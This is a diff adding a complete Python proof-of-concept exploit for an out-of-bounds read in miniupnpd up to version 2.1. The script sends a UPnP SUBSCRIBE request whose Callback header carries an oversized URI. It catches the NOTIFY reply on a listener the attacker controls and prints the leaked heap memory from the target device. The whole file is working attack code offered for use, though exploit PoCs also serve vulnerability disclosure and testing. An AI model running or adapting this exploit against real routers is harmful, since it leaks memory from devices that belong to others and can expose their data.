@@ -1,0 +1,57 @@
+#!/usr/bin/python3
+# miniupnpd <= v2.1 read out-of-bounds PoC
+# by b1ack0wl
+# https://github.com/b1ack0wl/miniupnpd_poc
+
+import requests, socketserver, argparse, sys
+
+class OK_HTTP_Response(socketserver.StreamRequestHandler):
+  def handle(self):
+    self.request.settimeout(self.server.timeout)
+    self.server.notify = b""
+    try:
+      line = self.rfile.read(1)
+      while len(line) > 0:
+        self.server.notify += line
+        line = self.rfile.read(1)
+    except:
+      pass
+    self.wfile.write(b"HTTP/1.1 200 OK\r\n\r\n")
+
+def splash():
+  print("[*] miniupnpd <= v2.1 read out-of-bounds vulnerability [PoC]")
+  print("[*] by b1ack0wl")
+
+def leak_data(args):
+  leak_size = ((1024*args.leak_amount)+526)
+  callback_uri= "A" * leak_size
+  headers= {'NT': 'upnp:event', 'Callback': '<http://{}:{}/{}>'.format(args.callback_ip,args.callback_port,callback_uri), 'Timeout': 'Second-20'}
+  server = socketserver.TCPServer((args.callback_ip, args.callback_port), OK_HTTP_Response)
+  server.timeout = args.timeout
+  print("[+] Sending request...")
+  requests.request(method="SUBSCRIBE",url="http://{}:{}/evt/L3F".format(args.target_ip,args.target_port),headers=headers,timeout=args.timeout)
+  server.handle_request()
+  leaked_data = server.notify[1023::] # Skip over the first 1024 bytes since it just contains 'NOTIFY /AAA...'
+  print("[+] Leaked Data: {}".format(leaked_data))
+  print("[+] Leaked Length: {}".format(len(leaked_data)))
+  print("[+] Done")
+
+def main():
+  poc_parser = argparse.ArgumentParser( add_help=True, description='Miniupnpd <= v2.1 read out-of-bounds vulnerability',formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+  poc_parser.add_argument('target_ip', help='IP address of vulnerable device.')
+  poc_parser.add_argument('target_port', default=5000, help="Target Port.", type=int)
+  poc_parser.add_argument('--callback_ip', help="Local IP address for httpd listener.", type=str)
+  poc_parser.add_argument('--callback_port', help="Local port for httpd listener.", type=int)
+  poc_parser.add_argument('--timeout', default=5, help="Timeout for http requests (in seconds).", type=float)
+  poc_parser.add_argument('--leak_amount', default=1, help="Amount of arbitrary heap data to leak (in KB).", type=int)
+  args = poc_parser.parse_args()
+  arguments = ['target_ip', 'target_port', 'callback_ip', 'callback_port' ]
+  for i in arguments:
+    if getattr(args, i) == None:
+      poc_parser.print_help()
+      sys.exit(1)
+  leak_data(args)
+
+if __name__ == '__main__':
+    splash()
+    main()
